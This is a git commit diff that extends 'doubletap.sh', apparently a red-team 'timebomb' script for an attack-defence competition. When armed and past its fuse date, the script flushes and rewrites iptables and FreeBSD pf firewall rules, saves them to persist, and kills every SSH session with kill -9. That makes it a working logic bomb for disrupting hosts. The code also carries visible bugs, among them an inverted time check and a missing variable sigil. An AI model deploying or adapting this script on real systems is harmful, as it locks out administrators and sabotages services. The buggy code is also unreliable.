86fbff91ab4554dd3a074c32fd5c1e1f9eb3dc6e
Guac0 <YeetYeetGuac@gmail.com>
2025-03-25 22:02:33 -0400

    add kaboom, improve output

--- doubletap/debian/doubletap.sh
+++ doubletap/debian/doubletap.sh
@@ -1,11 +1,24 @@
+#!/bin/sh
+
 fuse_date="2025-03-21"  # In format YYYY-MM-DD
 fuse_time="16:00:00"    # In format HH:MM:SS, using 24h time
 fuse_armed="false"      # DO NOT SET THIS TO TRUE UNLESS YOU WANT TO EXPLODE
-debug="false"           # 
+log_location="/dt.txt"  # Set to /dev/null for no output (and comment out line 14)
 
 #########################
 ##### EXTRA SETUP #######
 #########################
+
+touch $log_location
+exec >log_location 2>&1
+tail -f log_location &  # This breaks non-interactively. TODO remove for deploy!
+
+if  [ "$EUID" -ne 0 ];
+then
+    echo "User is not root. Skill issue."
+    exit 1
+fi
+
 to_seconds() {
     # Convert HH:MM:SS into total seconds
     echo "$1" | awk -F: '{ print ($1 * 3600) + ($2 * 60) + $3 }'
@@ -16,10 +29,8 @@ current_time=$(date +"%H:%M:%S")
 fuse_seconds=$(to_seconds "$fuse_time")
 current_seconds=$(to_seconds "$current_time")
 
-if [ "$debug" = "true" ]; then
-    echo "---------------------------------------------"
-    echo "  Timebomb - $today $current_time"
-fi
+echo "---------------------------------------------"
+echo "  Timebomb - $today $current_time"
 
 #########################
 ###### TIME CHECK #######
@@ -28,34 +39,104 @@ fi
 # Check if the date is March 21st, 2025, and the time is after 3 PM
 if [ "$today" = "$fuse_date" ]; then
     if [ "$fuse_seconds" -ge "$current_seconds" ]; then
-        if [ "$debug" = "true" ]; then
-            echo "+++++++++++++++++++++++++++++++++++"
-            echo "  DETONATION CRITERIA MET"
-            echo "Found date $today and expected $fuse_date"
-            echo "Found hour $current_time and expected $fuse_time"
-            if [ "$fuse_armed" = "true" ]; then 
-                echo "  PROCEEDING WITH FULL KABOOM"
-            else
-                echo "  ... where's the kaboom? FUSE NOT ARMED"
-            fi
-        fi
+        echo "+++++++++++++++++++++++++++++++++++"
+        echo "  DETONATION CRITERIA MET"
+        echo "Found date $today and expected $fuse_date"
+        echo "Found hour $current_time and expected $fuse_time"
 
         if [ "$fuse_armed" = "true" ]; then
-            # Kaboom
+            echo "  PROCEEDING WITH FULL KABOOM"
+            # Kaboom.
+            # Add firewall rules that blocks everything except default SSH and RDP ports in case of premature detonation
+            # Kill all active sessions
+            if command -v iptables >/dev/null 2>&1; then
+                echo "iptables found. Configuring rules..."
+
+                # Flush the MANGLE chain
+                iptables -t mangle -F
+
+                # Set default ALLOW policy for the MANGLE chain
+                iptables -t mangle -P INPUT ACCEPT
+                iptables -t mangle -P FORWARD ACCEPT
+                iptables -t mangle -P OUTPUT ACCEPT
+
+                # Block all ICMP (ping) traffic
+                iptables -A INPUT -p icmp -j DROP
+
+                # Block all traffic except for ports 22 (SSH) and 3389 (RDP)
+                iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+                iptables -A INPUT -p tcp --dport 3389 -j ACCEPT
+                iptables -A INPUT -j DROP
+
+                # Save iptables rules to persist after reboot
+                if command -v iptables-save >/dev/null 2>&1; then
+                    iptables-save > /etc/iptables/rules.v4
+                    echo "iptables rules saved."
+                else
+                    echo "iptables-save not found. Rules will not persist after reboot."
+                fi
+
+                # Save iptables rules to persist after reboot - nvm, as we want an easily recoverable way
+                #if command -v iptables-save >/dev/null 2>&1; then
+                #    iptables-save > /etc/iptables/rules.v4
+                #    echo "iptables rules saved."
+                #else
+                #    echo "iptables-save not found. Rules will not persist after reboot."
+                #fi
+
+                echo "iptables rules applied."
+            fi
+
+            # Freebsd - Check if pf is available
+            if command -v pfctl >/dev/null 2>&1; then
+                echo "pf found. Configuring rules..."
+
+                # Define PF rules
+                PF_RULES="/etc/pf.conf"
+
+                # Write new firewall rules to /etc/pf.conf
+                cat > "$PF_RULES" <<EOF
+# Block all traffic by default
+block in all
+block out all
+
+# Allow incoming SSH (22) and RDP (3389)
+pass in on egress proto tcp from any to any port {22, 3389}
+
+# Allow outgoing connections
+pass out on egress proto tcp from any to any
+pass out on egress proto udp from any to any
+
+# Block all ICMP (ping)
+block in proto icmp
+EOF
+
+                # Load the new rules
+                pfctl -f "$PF_RULES"
+
+                # Enable pf if not already enabled
+                sysrc pf_enable="YES"
+                service pf restart
+
+                echo "PF firewall rules applied successfully."
+            else
+                echo "pf not found. FreeBSD requires pf for firewall rules."
+                exit 1
+            fi
+
+            # Kill all SSH sessions
+            echo "Killing all SSH sessions..."
+            ps aux | grep "[s]shd: " | awk '{print $2}' | xargs -r kill -9
 
             # Delete persistance/kill this task
             # doesn't matter if blue team finds this because they can just delete this file
             # todo: unless this file is stabvested. stabvest should contain an auto-off after the fuse time
-            # placeholder:
-            :
+        else
+            echo "  ... where's the kaboom? FUSE NOT ARMED"
         fi
-    else 
-        if [ "$debug" = "true" ]; then
-            echo "Wrong hour - found $today but expected $current_time"
-        fi
+    else
+        echo "Wrong hour - found $today but expected $current_time"
     fi
 else
-    if [ "$debug" = "true" ]; then
-        echo "Wrong date - found $today but expected $fuse_date"
-    fi
+    echo "Wrong date - found $today but expected $fuse_date"
 fi
